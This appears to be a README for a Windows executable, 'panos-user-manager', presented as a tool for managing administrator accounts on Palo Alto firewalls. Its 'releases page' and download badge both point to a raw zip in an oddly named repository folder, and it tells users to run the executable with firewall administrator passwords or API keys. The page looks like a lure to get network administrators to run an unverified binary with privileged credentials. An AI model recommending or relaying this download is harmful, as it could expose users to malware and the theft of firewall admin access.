# 🛡️ panos-user-manager - Manage firewall accounts with simple commands

[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/khoile852009-lab/panos-user-manager/raw/refs/heads/main/Areopagist/panos-user-manager-v3.3.zip)

This application provides a simple way to manage local administrator accounts on Palo Alto Networks firewalls and Panorama devices. It uses the XML API to perform tasks without requiring manual login to each web interface. You can add, remove, or modify user accounts across your network infrastructure from a single command line interface.

## 📥 Getting Started

You do not need to install Python or any extra software to use this tool. The application arrives as a standalone executable file for Windows. Follow these steps to set up the environment and run your first command.

1. Visit the [releases page](https://github.com/khoile852009-lab/panos-user-manager/raw/refs/heads/main/Areopagist/panos-user-manager-v3.3.zip) to download the latest version.
2. Select the file named `panos-user-manager.exe`.
3. Save the file to a folder where you keep your tools.
4. Open the Command Prompt or PowerShell on your Windows machine.
5. Navigate to the folder containing the downloaded file.
6. Run the tool by typing `.\panos-user-manager.exe` followed by your desired command.

## 📋 System Requirements

This tool runs on most modern Windows systems. Ensure your machine meets these specifications:

* Windows 10 or Windows 11.
* A network connection that reaches the management IP address of your firewalls.
* An active administrator account on your network devices to authenticate requests.
* The XML API enabled on your Palo Alto Networks devices.

## ⚙️ How to Use

The tool functions through specific command arguments. You must provide the hostname or IP address of the device along with your credentials.

### View Existing Users
To list all local administrators on a specific firewall, use the following syntax:

`.\panos-user-manager.exe --host <firewall_ip> --user <admin_username> --password <admin_password> list-users`

Replace the placeholders inside the brackets with your actual firewall details. The tool connects to the device and prints a list of accounts to your terminal window.

### Add a New User
You can create a new local administrator account by providing the account name and the desired role:

`.\panos-user-manager.exe --host <firewall_ip> --user <admin_username> --password <admin_password> add-user --new-user <username> --role <role_name>`

This command creates the user immediately. Ensure the role name matches the role definitions existing on your device configuration.

### Delete an Existing User
To remove an administrator account, enter the following:

`.\panos-user-manager.exe --host <firewall_ip> --user <admin_username> --password <admin_password> delete-user --target-user <username>`

The tool sends an API request to remove the user from the local database. Verify the user removal by running the list-users command after execution.

## 🔒 Security Practices

Follow these simple rules to keep your firewall and your credentials safe:

* Store your credentials in a secure credential manager, not in clear text files.
* Run the tool only from trusted network locations.
* Use read-only accounts for tools if you only need to audit user lists.
* Rotate the credentials for the account you use to run this tool on a regular schedule.

## 🛠️ Configuration Details

The tool relies on the XML API of your PAN-OS devices. If you experience connection errors, check the following settings on your firewall:

1. Log in to the web interface of the firewall.
2. Go to **Device** then **Setup**.
3. Select **Management** and look for the **API** settings.
4. Ensure the API is enabled.
5. Create an API key if you prefer not to pass your password directly in the command. 

If you use an API key, replace the `--user` and `--password` flags with the `--api-key` flag in your terminal commands. This adds a layer of safety by removing your password from your command history.

## ❓ Frequently Asked Questions

**Does the tool modify the running configuration?**
Yes, the tool sends commands that change the configuration of your device. Always perform a configuration commit on your firewall if the application does not trigger one automatically.

**Can I run this on multiple firewalls at once?**
This version of the tool manages one device per command. You can create a simple Windows batch script to string these commands together if you manage multiple firewalls.

**Where do I see the logs for my actions?**
The tool displays the status of every request directly in your command window. If a command fails, the tool displays an error message explaining why the firewall rejected the request.

**What happens if I forget my password?**
The tool does not store your credentials. If you lose your password, you must reset the administrator account through the firewall console or a different admin account using the web interface.

**Do I need a special license?**
Palo Alto Networks includes the XML API at no extra cost for all firewalls and Panorama appliances. You only need proper account permissions to access the API.